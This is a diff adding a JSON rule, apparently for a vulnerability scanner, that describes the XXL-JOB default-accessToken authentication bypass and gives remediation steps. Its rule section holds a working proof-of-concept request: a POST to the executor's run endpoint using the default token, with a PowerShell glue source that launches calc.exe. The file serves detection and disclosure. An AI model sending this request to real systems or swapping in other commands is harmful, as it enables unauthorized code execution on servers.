@@ -1,0 +1,24 @@
+{
+    "vul_name": "XXL-JOB 默认 accessToken 身份绕过漏洞",
+    "level": "高危",
+    "description": "XXL-JOB 是一款开源的分布式任务调度平台，用于实现大规模任务的调度和执行。\nXXL-JOB 默认配置下，用于调度通讯的 accessToken 不是随机生成的，而是使用application.properties 配置文件中的默认值。在实际使用中如果没有修改默认值，攻击者可利用此绕过认证调用 executor，执行任意代码，从而获取服务器权限。",
+    "product": "XXL-JOB",
+    "version": "\nxuxueli-xxl-job\nversion<=2.4.0受影响。",
+    "cve": "XVE-2023-21328",
+    "reference": "https://www.cnblogs.com/chm0d/p/17805168.html",
+    "fixing": "1把accessToken置空\n2.使用accessToken时设置强accessToken或随机accessToken",
+    "rule": {
+        "path": "run",
+        "method": "POST",
+        "headers": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nXXL-JOB-ACCESS-TOKEN: default_token\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nContent-Length: 365",
+        "body": "{\n  \"jobId\": 1,\n  \"executorHandler\": \"demoJobHandler\",\n  \"executorParams\": \"demoJobHandler\",\n  \"executorBlockStrategy\": \"SERIAL_EXECUTION\",\n  \"executorTimeout\": 0,\n  \"logId\": 1,\n  \"logDateTime\": 1586629003729,\n  \"glueType\": \"GLUE_POWERSHELL\",\n  \"glueSource\": \"calc.exe\",\n  \"glueUpdatetime\": 1586699003758,\n  \"broadcastIndex\": 0,\n  \"broadcastTotal\": 0\n}",
+        "status_code": "200",
+        "keywords": "200",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
